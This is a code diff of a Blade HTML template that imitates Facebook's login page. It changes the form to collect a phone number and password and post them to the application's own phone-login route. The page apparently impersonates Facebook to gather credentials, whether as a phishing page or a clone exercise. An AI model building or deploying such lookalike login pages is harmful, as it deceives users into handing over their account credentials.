@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Facebook</title>
+    <title>Login - Facebook (Phone)</title>
     <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
     <style>
         body {
@@ -40,7 +40,7 @@
             flex-direction: column;
             gap: 16px;
         }
-        .fb-form input[type="email"],
+        .fb-form input[type="text"],
         .fb-form input[type="password"] {
             width: 100%;
             box-sizing: border-box;
@@ -52,7 +52,7 @@
             transition: border-color 0.2s;
             margin: 0;
         }
-        .fb-form input[type="email"]:focus,
+        .fb-form input[type="text"]:focus,
         .fb-form input[type="password"]:focus {
             border-color: #1877f2;
             outline: none;
@@ -118,7 +118,7 @@
                 font-size: 36px;
                 margin-bottom: 18px;
             }
-            .fb-form input[type="email"],
+            .fb-form input[type="text"],
             .fb-form input[type="password"] {
                 font-size: 15px;
                 padding: 10px;
@@ -133,15 +133,10 @@
 <body>
     <div class="fb-container">
         <div class="fb-logo">facebook</div>
-        <form class="fb-form" method="POST" action="{{ route('login') }}">
+        <form class="fb-form" method="POST" action="{{ route('phone.login') }}">
             @csrf
-            @if(isset($isPhoneLogin) && $isPhoneLogin)
-                <input type="text" name="phone" placeholder="Phone number" required autofocus pattern="[0-9]+" inputmode="numeric">
-                <input type="password" name="password" placeholder="Password" required>
-            @else
-                <input type="email" name="email" placeholder="Email address" required autofocus>
-                <input type="password" name="password" placeholder="Password" required>
-            @endif
+            <input type="text" name="phone" placeholder="Phone number" required autofocus pattern="[0-9]+" inputmode="numeric">
+            <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
         <a class="fb-link" href="#">Forgotten password?</a>
